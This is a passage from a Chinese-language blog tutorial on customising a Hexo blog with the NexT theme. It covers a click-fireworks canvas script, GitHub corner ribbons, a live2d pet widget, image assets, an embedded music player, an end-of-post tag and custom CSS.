class="number">1</span>)],a.radius=anime.random(<span class="number">16</span>,<span class="number">32</span>),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">createCircle</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=<span class="string">&quot;#F00&quot;</span>,a.radius=<span class="number">0.1</span>,a.alpha=<span class="number">0.5</span>,a.lineWidth=<span class="number">6</span>,a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="number">1</span>&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">renderParticule</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">animateParticules</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> a=createCircle(e,t),n=[],i=<span class="number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;<span class="attr">targets</span>:n,<span class="attr">x</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.x&#125;,<span class="attr">y</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.y&#125;,<span class="attr">radius</span>:<span class="number">0.1</span>,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule&#125;).add(&#123;<span class="attr">targets</span>:a,<span class="attr">radius</span>:anime.random(<span class="number">80</span>,<span class="number">160</span>),<span class="attr">lineWidth</span>:<span class="number">0</span>,<span class="attr">alpha</span>:&#123;<span class="attr">value</span>:<span class="number">0</span>,<span class="attr">easing</span>:<span class="string">&quot;linear&quot;</span>,<span class="attr">duration</span>:anime.random(<span class="number">600</span>,<span class="number">800</span>)&#125;,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule,<span class="attr">offset</span>:<span class="number">0</span>&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> n=<span class="built_in">this</span>,i=<span class="built_in">arguments</span>;<span class="built_in">clearTimeout</span>(a),a=<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e.apply(n,i)&#125;,t)&#125;&#125;<span class="keyword">var</span> canvasEl=<span class="built_in">document</span>.querySelector(<span class="string">&quot;.fireworks&quot;</span>);<span class="keyword">if</span>(canvasEl)&#123;<span class="keyword">var</span> ctx=canvasEl.getContext(<span class="string">&quot;2d&quot;</span>),numberOfParticules=<span class="number">30</span>,pointerX=<span class="number">0</span>,pointerY=<span class="number">0</span>,tap=<span class="string">&quot;mousedown&quot;</span>,colors=[<span class="string">&quot;#FF1461&quot;</span>,<span class="string">&quot;#18FF92&quot;</span>,<span class="string">&quot;#5A87FF&quot;</span>,<span class="string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;canvasEl.width=<span class="number">2</span>*<span class="built_in">window</span>.innerWidth,canvasEl.height=<span class="number">2</span>*<span class="built_in">window</span>.innerHeight,canvasEl.style.width=<span class="built_in">window</span>.innerWidth+<span class="string">&quot;px&quot;</span>,canvasEl.style.height=<span class="built_in">window</span>.innerHeight+<span class="string">&quot;px&quot;</span>,canvasEl.getContext(<span class="string">&quot;2d&quot;</span>).scale(<span class="number">2</span>,<span class="number">2</span>)&#125;,<span class="number">500</span>),render=anime(&#123;<span class="attr">duration</span>:<span class="number">1</span>/<span class="number">0</span>,<span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);<span class="built_in">document</span>.addEventListener(tap,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="number">1</span>),setCanvasSize(),<span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>,setCanvasSize,!<span class="number">1</span>)&#125;<span class="string">&quot;use strict&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">updateCoords</span>(<span class="params">e</span>)</span>&#123;pointerX=(e.clientX||e.touches[<span class="number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="function"><span class="keyword">function</span> <span class="title">setParticuleDirection</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> t=anime.random(<span class="number">0</span>,<span class="number">360</span>)*<span class="built_in">Math</span>.PI/<span class="number">180</span>,a=anime.random(<span class="number">50</span>,<span class="number">180</span>),n=[-<span class="number">1</span>,<span class="number">1</span>][anime.random(<span class="number">0</span>,<span class="number">1</span>)]*a;<span class="keyword">return</span>&#123;<span class="attr">x</span>:e.x+n*<span class="built_in">Math</span>.cos(t),<span class="attr">y</span>:e.y+n*<span class="built_in">Math</span>.sin(t)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">createParticule</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="number">0</span>,colors.length-<span class="number">1</span>)],a.radius=anime.random(<span class="number">16</span>,<span class="number">32</span>),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">createCircle</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=<span class="string">&quot;#F00&quot;</span>,a.radius=<span class="number">0.1</span>,a.alpha=<span class="number">0.5</span>,a.lineWidth=<span class="number">6</span>,a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="number">1</span>&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">renderParticule</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">animateParticules</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> a=createCircle(e,t),n=[],i=<span class="number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;<span class="attr">targets</span>:n,<span class="attr">x</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.x&#125;,<span class="attr">y</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.y&#125;,<span class="attr">radius</span>:<span class="number">0.1</span>,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule&#125;).add(&#123;<span class="attr">targets</span>:a,<span class="attr">radius</span>:anime.random(<span class="number">80</span>,<span class="number">160</span>),<span class="attr">lineWidth</span>:<span class="number">0</span>,<span class="attr">alpha</span>:&#123;<span class="attr">value</span>:<span class="number">0</span>,<span class="attr">easing</span>:<span class="string">&quot;linear&quot;</span>,<span class="attr">duration</span>:anime.random(<span class="number">600</span>,<span class="number">800</span>)&#125;,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule,<span class="attr">offset</span>:<span class="number">0</span>&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> n=<span class="built_in">this</span>,i=<span class="built_in">arguments</span>;<span class="built_in">clearTimeout</span>(a),a=<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e.apply(n,i)&#125;,t)&#125;&#125;<span class="keyword">var</span> canvasEl=<span class="built_in">document</span>.querySelector(<span class="string">&quot;.fireworks&quot;</span>);<span class="keyword">if</span>(canvasEl)&#123;<span class="keyword">var</span> ctx=canvasEl.getContext(<span class="string">&quot;2d&quot;</span>),numberOfParticules=<span class="number">30</span>,pointerX=<span class="number">0</span>,pointerY=<span class="number">0</span>,tap=<span class="string">&quot;mousedown&quot;</span>,colors=[<span class="string">&quot;#FF1461&quot;</span>,<span class="string">&quot;#18FF92&quot;</span>,<span class="string">&quot;#5A87FF&quot;</span>,<span class="string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;canvasEl.width=<span class="number">2</span>*<span class="built_in">window</span>.innerWidth,canvasEl.height=<span class="number">2</span>*<span class="built_in">window</span>.innerHeight,canvasEl.style.width=<span class="built_in">window</span>.innerWidth+<span class="string">&quot;px&quot;</span>,canvasEl.style.height=<span class="built_in">window</span>.innerHeight+<span class="string">&quot;px&quot;</span>,canvasEl.getContext(<span class="string">&quot;2d&quot;</span>).scale(<span class="number">2</span>,<span class="number">2</span>)&#125;,<span class="number">500</span>),render=anime(&#123;<span class="attr">duration</span>:<span class="number">1</span>/<span class="number">0</span>,<span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);<span class="built_in">document</span>.addEventListener(tap,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="number">1</span>),setCanvasSize(),<span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>,setCanvasSize,!<span class="number">1</span>)&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/laout/_layout.swig		<span class="comment">#添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if theme.fireworks %&#125;   &lt;canvas class&#x3D;&quot;fireworks&quot; style&#x3D;&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;&#x2F;canvas&gt;    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;&#x2F;cdn.bootcss.com&#x2F;animejs&#x2F;2.2.0&#x2F;anime.min.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;js&#x2F;fireworks.js&quot;&gt;&lt;&#x2F;script&gt;&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml		<span class="comment">#在主题文件中加入</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Fireworksfireworks: true</span></span><br></pre></td></tr></table></figure>
<h2 id="github角落及丝带"><a href="#github角落及丝带" class="headerlink" title="github角落及丝带"></a>github角落及丝带</h2><p>在<a href="http://tholman.com/github-corners/">GitHub Corners（角落）</a>或<a href="https://github.blog/2008-12-19-github-ribbons/">GitHub Ribbons（丝带）</a>选择一款你喜欢的挂饰，拷贝方框内的代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_layout.swig		<span class="comment">#将代码加入&lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;下方</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改自己的github链接（https://github.com/eonun）</span></span><br></pre></td></tr></table></figure>
<p>右上角蓝底:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://github.com/eonun&quot;</span> <span class="attr">class</span>=<span class="string">&quot;github-corner&quot;</span> <span class="attr">aria-label</span>=<span class="string">&quot;View source on GitHub&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;80&quot;</span> <span class="attr">height</span>=<span class="string">&quot;80&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 250 250&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">style</span>=<span class="string">&quot;transform-origin: 130px 106px;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-arm&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-body&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;<span class="keyword">@keyframes</span> octocat-wave&#123;0%,100%&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">0</span>)&#125;20%,60%&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(-<span class="number">25deg</span>)&#125;40%,80%&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">10deg</span>)&#125;&#125;<span class="keyword">@media</span> (<span class="attribute">max-width:</span><span class="number">500px</span>)&#123;<span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:none&#125;<span class="selector-class">.github-corner</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="宠物"><a href="#宠物" class="headerlink" title="宠物"></a>宠物</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-helper-live2d</span><br><span class="line">yarn add live2d-widget-model-tororo		<span class="comment">#安装宠物白猫的模块</span></span><br><span class="line">vim _config.yml	<span class="comment">#博客的或主题的主配置文件都行,加入代码选择宠物类型</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/EYHN/hexo-helper-live2d">hexo-helper-live2d</a><br><a href="https://github.com/xiazeyu/live2d-widget-models">live2d-widget-models</a></p>
<details><summary>宠物样式表</summary><br>

live2d-widget-model-chitose<br>
live2d-widget-model-epsilon2_1<br>
live2d-widget-model-gf<br>
live2d-widget-model-haru/01 (live2d-widget-model-haru)<br>
live2d-widget-model-haru/02 (live2d-widget-model-haru)<br>
live2d-widget-model-haruto<br>
live2d-widget-model-hibiki<br>
live2d-widget-model-hijiki<br>
live2d-widget-model-izumi<br>
live2d-widget-model-koharu<br>
live2d-widget-model-miku<br>
live2d-widget-model-ni-j<br>
live2d-widget-model-nico<br>
live2d-widget-model-nietzsche<br>
live2d-widget-model-nipsilon<br>
live2d-widget-model-nito<br>
live2d-widget-model-shizuku<br>
live2d-widget-model-tororo(白猫)<br>
live2d-widget-model-tsumiki<br>
live2d-widget-model-unitychan<br>
live2d-widget-model-wanko<br>
live2d-widget-model-z16<br>

</details>

<p><a href="https://blog.csdn.net/wang_123_zy/article/details/87181892">样式预览</a></p>
<p>需要先使用 <code>yarn add 模型的包名</code> 来安装</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span>	<span class="comment"># 插件在站点上的根目录(相对路径)</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span>	<span class="comment"># 脚本文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span>	<span class="comment"># 模型文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span>	<span class="comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span></span><br><span class="line">  <span class="attr">log:</span> <span class="literal">false</span>	<span class="comment"># 调试, 是否在控制台输出日志</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-tororo</span>	<span class="comment"># 模块名，博客根目录/node_models/ 下的目录名</span></span><br><span class="line">  <span class="attr">display:</span>		<span class="comment">#放置位置和大小</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">600</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span>		<span class="comment">#是否在手机端显示</span></span><br><span class="line">  <span class="attr">react:</span></span><br><span class="line">    <span class="attr">opacity:</span> <span class="number">0.7</span>    <span class="comment">#透明</span></span><br></pre></td></tr></table></figure>
<h2 id="文章插入图片"><a href="#文章插入图片" class="headerlink" title="文章插入图片"></a>文章插入图片</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.yml		<span class="comment">#修改博客配置文件，开启资源文件夹</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment">#开启后新建文章的时会同时创建一个同名文件夹用于存放文章资源（如:图片）</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-asset-image 	<span class="comment">#安装插件</span></span><br><span class="line">vim node_modules/hexo-asset-image/index.js   <span class="comment">#修改文件配置，修正一个错误</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> endPos = link.length-<span class="number">1</span>;	<span class="comment">//将第24行修改为这样</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>将图片放到该文件夹下，在文章中添加图片</strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">![<span class="string">image_name</span>](<span class="link">name.jpg</span>)		#只需要添加文件名即可，无需加上目录</span><br></pre></td></tr></table></figure>
<h2 id="侧边栏加入音乐播放器"><a href="#侧边栏加入音乐播放器" class="headerlink" title="侧边栏加入音乐播放器"></a>侧边栏加入音乐播放器</h2><p>到网易云音乐选择歌单，生成外链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe frameborder&#x3D;&quot;no&quot; border&#x3D;&quot;0&quot; marginwidth&#x3D;&quot;0&quot; marginheight&#x3D;&quot;0&quot; width&#x3D;298 height&#x3D;52 src&#x3D;&quot;&#x2F;&#x2F;music.163.com&#x2F;outchain&#x2F;player?type&#x3D;2&amp;id&#x3D;1365959078&amp;auto&#x3D;1&amp;height&#x3D;32&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/sidebar.swig	<span class="comment">#将生成的外链放到合适的位置即可</span></span><br></pre></td></tr></table></figure>
<h2 id="文章结束标语"><a href="#文章结束标语" class="headerlink" title="文章结束标语"></a>文章结束标语</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/passage-end-tag.swig	<span class="comment">#新建文件并加入内容</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class&#x3D;&quot;fa fa-paw&quot;&gt;&lt;&#x2F;i&gt;感谢阅读-------------&lt;&#x2F;div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/post.swig	<span class="comment">#在post body 中 END POST BODY 前加入</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include &#39;passage-end-tag.swig&#39; %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml		<span class="comment">#加入以下内容</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line"><span class="attr">passage_end_tag:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml</span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义自定义文件路径</span></span><br><span class="line"><span class="comment"># 在站点目录`source/_data`中创建自定义文件，并在下面取消注释所需的文件</span></span><br><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.swig</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.swig</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.swig</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.swig</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.swig</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.swig</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.swig</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>
<h3 id="文章阴影"><a href="#文章阴影" class="headerlink" title="文章阴影"></a>文章阴影</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/_data/styles.styl	<span class="comment">#新建并添加自定义样式</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Custom styles.</span></span><br><span class="line"><span class="comment">// 主页文章添加阴影效果</span></span><br><span class="line"> <span class="selector-class">.post</span> &#123;</span><br><span class="line">   <span class="attribute">margin-top</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">margin-bottom</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">   -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> rgba(<span class="number">105</span>,<span class="number">105</span>,<span class="number">105</span>,<span class="number">0.5</span>);</span><br><span class="line">   -moz-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> rgba(<span class="number">105</span>,<span class="number">105</span>,<span class="number">105</span>,<span class="number">0.5</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="背景图及透明度"><a href="#背景图及透明度" class="headerlink" title="背景图及透明度"></a>背景图及透明度</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/_data/styles.styl	<span class="comment">#添加自定义样式</span></span><br><span class="line"><span class="comment">#将背景图放到图片目录(source/images)下即可</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加背景图片</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  background: url(/images/background.jpg);</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">  <span class="attribute">background-position</span>: <span class="number">50%</span> <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文章内容的透明度设置</span></span><br><span class="line"><span class="selector-class">.content-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//侧边框的透明度设置</span></span><br><span class="line"><span class="selector-class">.sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//站点概况透明度设置</span></span><br><span class="line"><span class="selector-class">.sidebar-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: 